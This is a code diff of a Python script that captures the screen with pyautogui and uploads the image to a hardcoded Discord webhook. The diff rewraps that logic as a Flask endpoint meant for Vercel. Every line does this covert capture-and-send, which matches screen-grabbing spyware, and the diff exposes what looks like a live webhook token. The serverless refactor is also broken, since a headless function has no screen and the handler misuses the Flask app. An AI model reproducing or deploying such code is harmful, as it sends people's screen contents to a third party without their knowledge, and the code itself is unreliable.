@@ -1,19 +1,27 @@
+from flask import Flask, send_file
 import pyautogui
 import requests
 
-# Your Discord Webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1342227822261047356/RtOuOXGBJEBwS6VCo_K7IHuQha1-oed1Twa1riIfjsC6WCFUhc50rurVRKeXXJPGgDwj"  # Replace with your actual webhook URL
+app = Flask(__name__)
 
-# Capture a screenshot
-screenshot = pyautogui.screenshot()
-screenshot.save("screenshot.png")
+WEBHOOK_URL = "https://discord.com/api/webhooks/1342227822261047356/RtOuOXGBJEBwS6VCo_K7IHuQha1-oed1Twa1riIfjsC6WCFUhc50rurVRKeXXJPGgDwj"  # Replace with your webhook
 
-# Send the screenshot to Discord
-with open("screenshot.png", "rb") as file:
-    response = requests.post(WEBHOOK_URL, files={"file": file})
+@app.route("/")
+def capture_screenshot():
+    # Capture screenshot
+    screenshot = pyautogui.screenshot()
+    screenshot_path = "/tmp/screenshot.png"  # Use /tmp for Vercel compatibility
+    screenshot.save(screenshot_path)
 
-# Check if the request was successful
-if response.status_code == 200 or response.status_code == 204:
-    print("Screenshot sent successfully!")
-else:
-    print("Failed to send:", response.text)
+    # Send to Discord Webhook
+    with open(screenshot_path, "rb") as file:
+        requests.post(WEBHOOK_URL, files={"file": file})
+
+    return "Screenshot taken and sent to Discord!"
+
+# Vercel needs this for deployment
+def handler(event, context):
+    return app(event, context)
+
+if __name__ == "__main__":
+    app.run(debug=True)
